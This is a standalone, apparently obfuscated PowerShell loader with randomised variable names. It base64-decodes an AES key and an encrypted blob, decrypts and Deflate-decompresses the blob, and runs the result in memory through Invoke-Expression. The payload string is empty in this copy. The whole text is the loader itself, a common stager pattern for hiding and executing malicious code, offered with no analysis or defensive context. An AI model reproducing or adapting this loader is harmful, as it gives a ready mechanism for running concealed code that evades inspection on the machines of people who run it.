$azrb = [System.Convert]::FromBase64String("")
$cdufiv = [System.Convert]::FromBase64String("Ds4zJQ3U1umwa7BEN/DUQPTPqZ3buWHbr4twdU1hctY=")
$rywd = New-Object "System.Security.Cryptography.AesManaged"
$rywd.Mode = [System.Security.Cryptography.CipherMode]::CBC
$rywd.BlockSize = 128
$rywd.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
$rywd.KeySize = 128
$rywd.Key = $cdufiv
$rywd.IV = $azrb[0..15]
$cpaifvetr = New-Object System.IO.MemoryStream(,$rywd.CreateDecryptor().TransformFinalBlock($azrb,16,$azrb.Length-16))
$xmepvjm = New-Object System.IO.MemoryStream
$ktwsdu = New-Object System.IO.Compression.DeflateStream $cpaifvetr, ([IO.Compression.CompressionMode]::Decompress)
$ktwsdu.CopyTo($xmepvjm)
$cpaifvetr.Close()
$rywd.Dispose()
$ktwsdu.Close()
$naxupyt = [System.Text.Encoding]::UTF8.GetString($xmepvjm.ToArray())
Invoke-Expression($naxupyt)
